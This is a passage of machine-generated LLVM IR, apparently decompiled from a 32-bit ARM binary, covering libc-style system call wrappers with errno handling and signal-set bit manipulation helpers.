  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_10ab0, { 1, 0 }
  uselistorder i32 %v12_10adc, { 1, 2, 0 }
  uselistorder i32 %v0_10ab054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_10aa8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_10a98, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_10a8c, { 1, 0 }
  uselistorder i32 %v0_10a84, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10ae8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_10ac0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_10b20(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b20:
  %v0_10b20 = call i32 @function_14bb0()
  ret i32 %v0_10b20
}

define i32 @function_10b30() local_unnamed_addr {
dec_label_pc_10b30:
  %v0_10b30 = call i32 @function_14bb0()
  ret i32 %v0_10b30
}

define i32 @function_10b40(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b40:
  %stack_var_-12 = alloca i32, align 4
  %v2_10b48 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_10b48, i32* @r1, align 4
  %v0_10b4c = call i32 @function_1541c()
  %v2_10b50 = icmp eq i32 %v0_10b4c, 0
  %v4_10b54 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_10b50, i32 -1, i32 %v4_10b54
  ret i32 %storemerge
}

define i32 @function_10b68(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10b68:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b68 = load i32, i32* @r7, align 4
  store i32 %v3_10b68, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10b90, label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b68
  %v0_10b80 = call i32 @function_10a30()
  %v0_10b84 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b84 = sub i32 0, %v0_10b84
  %v2_10b88 = inttoptr i32 %v0_10b80 to i32*
  store i32 %v1_10b84, i32* %v2_10b88, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10b94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b68, %dec_label_pc_10b80
  %v2_10b94 = phi i32 [ %v3_10b68, %dec_label_pc_10b68 ], [ %v2_10b94.pre, %dec_label_pc_10b80 ]
  %v0_10b90 = phi i32 [ %arg1, %dec_label_pc_10b68 ], [ -1, %dec_label_pc_10b80 ]
  store i32 %v2_10b94, i32* @r7, align 4
  ret i32 %v0_10b90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b90, { 1, 0 }
}

define i32 @function_10ba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10ba0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ba0 = load i32, i32* @r7, align 4
  store i32 %v3_10ba0, i32* %stack_var_-8, align 4
  %v0_10bac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10bac, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10bac, -4095
  br i1 %tmp, label %dec_label_pc_10bcc, label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10ba0
  %v0_10bbc = call i32 @function_10a30()
  %v0_10bc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bc0 = sub i32 0, %v0_10bc0
  %v2_10bc4 = inttoptr i32 %v0_10bbc to i32*
  store i32 %v1_10bc0, i32* %v2_10bc4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10bcc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10ba0, %dec_label_pc_10bbc
  %v1_10bd0 = phi i32 [ %v0_10bac, %dec_label_pc_10ba0 ], [ -1, %dec_label_pc_10bbc ]
  %v2_10bcc = phi i32 [ %v3_10ba0, %dec_label_pc_10ba0 ], [ %v2_10bcc.pre, %dec_label_pc_10bbc ]
  store i32 %v2_10bcc, i32* @r7, align 4
  ret i32 %v1_10bd0

; uselistorder directives
  uselistorder i32 %v0_10bac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10bcc, { 1, 0 }
}

define i32 @function_10bd8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10bd8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10bd8 = load i32, i32* @r7, align 4
  store i32 %v3_10bd8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10c00, label %dec_label_pc_10bf0

dec_label_pc_10bf0:                               ; preds = %dec_label_pc_10bd8
  %v0_10bf0 = call i32 @function_10a30()
  %v0_10bf4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bf4 = sub i32 0, %v0_10bf4
  %v2_10bf8 = inttoptr i32 %v0_10bf0 to i32*
  store i32 %v1_10bf4, i32* %v2_10bf8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10c04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bd8, %dec_label_pc_10bf0
  %v2_10c04 = phi i32 [ %v3_10bd8, %dec_label_pc_10bd8 ], [ %v2_10c04.pre, %dec_label_pc_10bf0 ]
  %v0_10c00 = phi i32 [ %arg1, %dec_label_pc_10bd8 ], [ -1, %dec_label_pc_10bf0 ]
  store i32 %v2_10c04, i32* @r7, align 4
  ret i32 %v0_10c00

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
}

define i32 @function_10c10(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10c10:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c10 = load i32, i32* @r7, align 4
  store i32 %v3_10c10, i32* %stack_var_-8, align 4
  %v0_10c1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c1c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c1c, -4095
  br i1 %tmp, label %dec_label_pc_10c3c, label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10c10
  %v0_10c2c = call i32 @function_10a30()
  %v0_10c30 = load i32, i32* %r7.global-to-local, align 4
  %v1_10c30 = sub i32 0, %v0_10c30
  %v2_10c34 = inttoptr i32 %v0_10c2c to i32*
  store i32 %v1_10c30, i32* %v2_10c34, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c3c

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10c2c
  %v1_10c40 = phi i32 [ %v0_10c1c, %dec_label_pc_10c10 ], [ -1, %dec_label_pc_10c2c ]
  %v2_10c3c = phi i32 [ %v3_10c10, %dec_label_pc_10c10 ], [ %v2_10c3c.pre, %dec_label_pc_10c2c ]
  store i32 %v2_10c3c, i32* @r7, align 4
  ret i32 %v1_10c40

; uselistorder directives
  uselistorder i32 %v0_10c1c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c3c, { 1, 0 }
}

define i32 @function_10c48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10c48:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10c7c, label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c48
  %v0_10c6c = call i32 @function_10a30()
  %v0_10c70 = load i32, i32* %r4.global-to-local, align 4
  %v1_10c70 = sub i32 0, %v0_10c70
  %v2_10c74 = inttoptr i32 %v0_10c6c to i32*
  store i32 %v1_10c70, i32* %v2_10c74, align 4
  br label %dec_label_pc_10c7c

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10c6c
  %v1_10c84 = phi i32 [ %arg1, %dec_label_pc_10c48 ], [ -1, %dec_label_pc_10c6c ]
  ret i32 %v1_10c84

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c7c, { 1, 0 }
}

define i32 @function_10c8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c8c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c8c = load i32, i32* @r7, align 4
  store i32 %v3_10c8c, i32* %stack_var_-8, align 4
  %v0_10c98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c98, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c98, -4095
  br i1 %tmp, label %dec_label_pc_10cb8, label %dec_label_pc_10ca8

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c8c
  %v0_10ca8 = call i32 @function_10a30()
  %v0_10cac = load i32, i32* %r7.global-to-local, align 4
  %v1_10cac = sub i32 0, %v0_10cac
  %v2_10cb0 = inttoptr i32 %v0_10ca8 to i32*
  store i32 %v1_10cac, i32* %v2_10cb0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10cb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10cb8

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10c8c, %dec_label_pc_10ca8
  %v1_10cbc = phi i32 [ %v0_10c98, %dec_label_pc_10c8c ], [ -1, %dec_label_pc_10ca8 ]
  %v2_10cb8 = phi i32 [ %v3_10c8c, %dec_label_pc_10c8c ], [ %v2_10cb8.pre, %dec_label_pc_10ca8 ]
  store i32 %v2_10cb8, i32* @r7, align 4
  ret i32 %v1_10cbc

; uselistorder directives
  uselistorder i32 %v0_10c98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cb8, { 1, 0 }
}

define i32 @function_10cc0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10cc0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10cc0 = load i32, i32* @r7, align 4
  store i32 %v3_10cc0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10ce8, label %dec_label_pc_10cd8

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10cc0
  %v0_10cd8 = call i32 @function_10a30()
  %v0_10cdc = load i32, i32* %r7.global-to-local, align 4
  %v1_10cdc = sub i32 0, %v0_10cdc
  %v2_10ce0 = inttoptr i32 %v0_10cd8 to i32*
  store i32 %v1_10cdc, i32* %v2_10ce0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10cec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cc0, %dec_label_pc_10cd8
  %v2_10cec = phi i32 [ %v3_10cc0, %dec_label_pc_10cc0 ], [ %v2_10cec.pre, %dec_label_pc_10cd8 ]
  %v0_10ce8 = phi i32 [ %arg1, %dec_label_pc_10cc0 ], [ -1, %dec_label_pc_10cd8 ]
  store i32 %v2_10cec, i32* @r7, align 4
  ret i32 %v0_10ce8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ce8, { 1, 0 }
}

define i32 @function_10cf8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10cf8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10cf8 = load i32, i32* @r4, align 4
  store i32 %v3_10cf8, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10d28, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10cf8
  %v0_10d18 = call i32 @function_10a30()
  %v0_10d1c = load i32, i32* %r4.global-to-local, align 4
  %v1_10d1c = sub i32 0, %v0_10d1c
  %v2_10d20 = inttoptr i32 %v0_10d18 to i32*
  store i32 %v1_10d1c, i32* %v2_10d20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10d2c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %dec_label_pc_10cf8, %dec_label_pc_10d18
  %v2_10d2c = phi i32 [ %v3_10cf8, %dec_label_pc_10cf8 ], [ %v2_10d2c.pre, %dec_label_pc_10d18 ]
  %v0_10d28 = phi i32 [ %arg1, %dec_label_pc_10cf8 ], [ -1, %dec_label_pc_10d18 ]
  store i32 %v2_10d2c, i32* @r4, align 4
  ret i32 %v0_10d28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d28, { 1, 0 }
}

define i32 @function_10d34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10d34:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d34 = load i32, i32* @r7, align 4
  store i32 %v3_10d34, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10d5c, label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10d34
  %v0_10d4c = call i32 @function_10a30()
  %v0_10d50 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d50 = sub i32 0, %v0_10d50
  store i32 %v1_10d50, i32* @r3, align 4
  %v2_10d54 = inttoptr i32 %v0_10d4c to i32*
  store i32 %v1_10d50, i32* %v2_10d54, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10d60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d5c

dec_label_pc_10d5c:                               ; preds = %dec_label_pc_10d34, %dec_label_pc_10d4c
  %v2_10d60 = phi i32 [ %v3_10d34, %dec_label_pc_10d34 ], [ %v2_10d60.pre, %dec_label_pc_10d4c ]
  %v0_10d5c = phi i32 [ %arg1, %dec_label_pc_10d34 ], [ -1, %dec_label_pc_10d4c ]
  store i32 %v2_10d60, i32* @r7, align 4
  ret i32 %v0_10d5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d5c, { 1, 0 }
}

define i32 @function_10d6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10d6c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10d6c = load i32, i32* @r4, align 4
  store i32 %v3_10d6c, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10d9c, label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10d6c
  %v0_10d8c = call i32 @function_10a30()
  %v0_10d90 = load i32, i32* %r4.global-to-local, align 4
  %v1_10d90 = sub i32 0, %v0_10d90
  %v2_10d94 = inttoptr i32 %v0_10d8c to i32*
  store i32 %v1_10d90, i32* %v2_10d94, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10da0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %dec_label_pc_10d6c, %dec_label_pc_10d8c
  %v2_10da0 = phi i32 [ %v3_10d6c, %dec_label_pc_10d6c ], [ %v2_10da0.pre, %dec_label_pc_10d8c ]
  %v0_10d9c = phi i32 [ %arg1, %dec_label_pc_10d6c ], [ -1, %dec_label_pc_10d8c ]
  store i32 %v2_10da0, i32* @r4, align 4
  ret i32 %v0_10d9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d9c, { 1, 0 }
}

define i32 @function_10dac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10dac:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10de0, label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dac
  %v0_10dd0 = call i32 @function_10a30()
  %v0_10dd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10dd4 = sub i32 0, %v0_10dd4
  store i32 %v1_10dd4, i32* @r3, align 4
  %v2_10dd8 = inttoptr i32 %v0_10dd0 to i32*
  store i32 %v1_10dd4, i32* %v2_10dd8, align 4
  br label %dec_label_pc_10de0

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dac, %dec_label_pc_10dd0
  %v1_10de8 = phi i32 [ %arg1, %dec_label_pc_10dac ], [ -1, %dec_label_pc_10dd0 ]
  ret i32 %v1_10de8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10de0, { 1, 0 }
}

define i32 @function_10df0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10df0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10df0 = load i32, i32* @r7, align 4
  store i32 %v3_10df0, i32* %stack_var_-8, align 4
  %v0_10dfc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10dfc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10dfc, -4095
  br i1 %tmp, label %dec_label_pc_10e1c, label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10df0
  %v0_10e0c = call i32 @function_10a30()
  %v0_10e10 = load i32, i32* %r7.global-to-local, align 4
  %v1_10e10 = sub i32 0, %v0_10e10
  store i32 %v1_10e10, i32* @r3, align 4
  %v2_10e14 = inttoptr i32 %v0_10e0c to i32*
  store i32 %v1_10e10, i32* %v2_10e14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10e1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10df0, %dec_label_pc_10e0c
  %v1_10e20 = phi i32 [ %v0_10dfc, %dec_label_pc_10df0 ], [ -1, %dec_label_pc_10e0c ]
  %v2_10e1c = phi i32 [ %v3_10df0, %dec_label_pc_10df0 ], [ %v2_10e1c.pre, %dec_label_pc_10e0c ]
  store i32 %v2_10e1c, i32* @r7, align 4
  ret i32 %v1_10e20

; uselistorder directives
  uselistorder i32 %v0_10dfc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e1c, { 1, 0 }
}

define i32 @function_10e28(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e28:
  store i32 %arg1, i32* @r0, align 4
  %v3_10e28 = load i32, i32* @r4, align 4
  %v0_10e30 = call i32 @function_10240()
  %v2_10e38 = call i32 @function_103d4(i32 %v0_10e30, i32 %arg1)
  store i32 %v3_10e28, i32* @r4, align 4
  ret i32 %v2_10e38

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_103d4, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10240, { 0, 3, 2, 1 }
}

define i32 @function_10e44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e44:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_10e5c, label %dec_label_pc_10e54

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10e44
  %v7_10e58 = icmp slt i32 %arg1, 65
  br i1 %v7_10e58, label %dec_label_pc_10e70, label %dec_label_pc_10e5c

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e54, %dec_label_pc_10e44
  %v0_10e5c = call i32 @function_10a30()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10e68 = inttoptr i32 %v0_10e5c to i32*
  store i32 22, i32* %v2_10e68, align 4
  %v0_10e78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e78

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e54
  %v0_10e70 = call i32 @function_10f78()
  store i32 %v0_10e70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e78

dec_label_pc_10e78:                               ; preds = %dec_label_pc_10e5c, %dec_label_pc_10e70
  %v0_10e78 = phi i32 [ %v0_10e78.pre, %dec_label_pc_10e5c ], [ %v0_10e70, %dec_label_pc_10e70 ]
  ret i32 %v0_10e78

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e78, { 1, 0 }
}

define i32 @function_10e88(i32* %arg1) local_unnamed_addr {
dec_label_pc_10e88:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10e90 = add i32 %tmp, 4
  %v3_10e90 = inttoptr i32 %v2_10e90 to i32*
  store i32 0, i32* %v3_10e90, align 4
  %v1_10e94 = load i32, i32* %r3.global-to-local, align 4
  %v2_10e94 = inttoptr i32 %v1_10e94 to i32*
  store i32 0, i32* %v2_10e94, align 4
  ret i32 0
}

define i32 @function_10e9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e9c:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10e9c = load i32, i32* @r4, align 4
  store i32 %v3_10e9c, i32* %stack_var_-16, align 4
  %v6_10e9c = load i32, i32* @r5, align 4
  %v9_10e9c = load i32, i32* @r6, align 4
  %v7_10ea4 = icmp eq i32 %arg2, -1
  br i1 %v7_10ea4, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_10e9c
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_10e9c
  %v2_10eac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_10ec8

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_10ed0

dec_label_pc_10ec8:                               ; preds = %bb
  store i32 123764, i32* @r6, align 4
  %v7_10ecc = icmp slt i32 %arg1, 65
  br i1 %v7_10ecc, label %dec_label_pc_10ee4, label %dec_label_pc_10ed0

dec_label_pc_10ed0:                               ; preds = %.thread16, %dec_label_pc_10ec8
  %v0_10ed0 = call i32 @function_10a30()
  store i32 22, i32* @r3, align 4
  store i32 -1, i32* @r2, align 4
  %v2_10edc = inttoptr i32 %v0_10ed0 to i32*
  store i32 22, i32* %v2_10edc, align 4
  %v0_10f3c.pre = load i32, i32* @r2, align 4
  br label %bb33

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ec8
  %v2_10ee4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10ee4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_10eec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10eec, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_10efc = call i32 @function_10f78()
  %v0_10f04 = load i32, i32* @r5, align 4
  %v0_10f08 = load i32, i32* @r6, align 4
  %v2_10f08 = add i32 %v0_10f08, 9288
  %v2_10f0c = call i32 @function_10f54(i32 %v2_10f08, i32 %v0_10f04)
  %v0_10f24 = load i32, i32* @r5, align 4
  %v3_10f2c = call i32 @function_13388(i32 %v0_10f24, i32 %v2_10ee4, i32 %v2_10eac)
  %v1_10f30 = icmp slt i32 %v3_10f2c, 0
  br i1 %v1_10f30, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_10ee4
  %v5_10f34 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_10f34, i32* @r2, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_10ee4
  store i32 -1, i32* @r2, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_10ed0, %bb32
  %v0_10f3c = phi i32 [ %v5_10f34, %bb31 ], [ %v0_10f3c.pre, %dec_label_pc_10ed0 ], [ -1, %bb32 ]
  %v2_10f44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10f44, i32* @r4, align 4
  store i32 %v6_10e9c, i32* @r5, align 4
  store i32 %v9_10e9c, i32* @r6, align 4
  ret i32 %v0_10f3c

; uselistorder directives
  uselistorder i32 ()* @function_10f78, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ed0, { 1, 0 }
}

define i32 @function_10f54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f54:
  %v1_10f54 = add i32 %arg2, -1
  %v3_10f58 = udiv i32 %v1_10f54, 32
  %v4_10f5c = mul nuw nsw i32 %v3_10f58, 4
  %v5_10f5c = add i32 %v4_10f5c, %arg1
  %v6_10f5c = inttoptr i32 %v5_10f5c to i32*
  %v7_10f5c = load i32, i32* %v6_10f5c, align 4
  %v1_10f60 = urem i32 %v1_10f54, 32
  %v7_10f68 = shl i32 1, %v1_10f60
  %v8_10f68 = and i32 %v7_10f5c, %v7_10f68
  %v10_10f68 = icmp ne i32 %v8_10f68, 0
  %. = zext i1 %v10_10f68 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_10f54, { 1, 0 }
}

define i32 @function_10f78() local_unnamed_addr {
dec_label_pc_10f78:
  %v0_10f78 = load i32, i32* @r1, align 4
  %v1_10f78 = add i32 %v0_10f78, -1
  %v3_10f7c = udiv i32 %v1_10f78, 32
  %v0_10f80 = load i32, i32* @r0, align 4
  %v4_10f80 = mul nuw nsw i32 %v3_10f7c, 4
  %v5_10f80 = add i32 %v0_10f80, %v4_10f80
  %v6_10f80 = inttoptr i32 %v5_10f80 to i32*
  %v7_10f80 = load i32, i32* %v6_10f80, align 4
  %v1_10f84 = urem i32 %v1_10f78, 32
  %v7_10f8c = shl i32 1, %v1_10f84
  %v8_10f8c = or i32 %v7_10f80, %v7_10f8c
  store i32 %v8_10f8c, i32* %v6_10f80, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10f78, { 1, 0 }
}

define i32 @function_10f9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f9c:
  %v1_10f9c = add i32 %arg2, -1
  %v3_10fa0 = udiv i32 %v1_10f9c, 32
  %v4_10fa4 = mul nuw nsw i32 %v3_10fa0, 4
  %v5_10fa4 = add i32 %v4_10fa4, %arg1
  %v6_10fa4 = inttoptr i32 %v5_10fa4 to i32*
  %v7_10fa4 = load i32, i32* %v6_10fa4, align 4
  %v1_10fa8 = urem i32 %v1_10f9c, 32
  %tmp = shl i32 -1, %v1_10fa8
  %v8_10fb0 = add i32 %tmp, -1
  %v9_10fb0 = and i32 %v7_10fa4, %v8_10fb0
  store i32 %v9_10fb0, i32* %v6_10fa4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10f9c, { 1, 0 }
}

define i32 @function_10fc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10fc0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_10fc0 = udiv i32 %arg1, 256
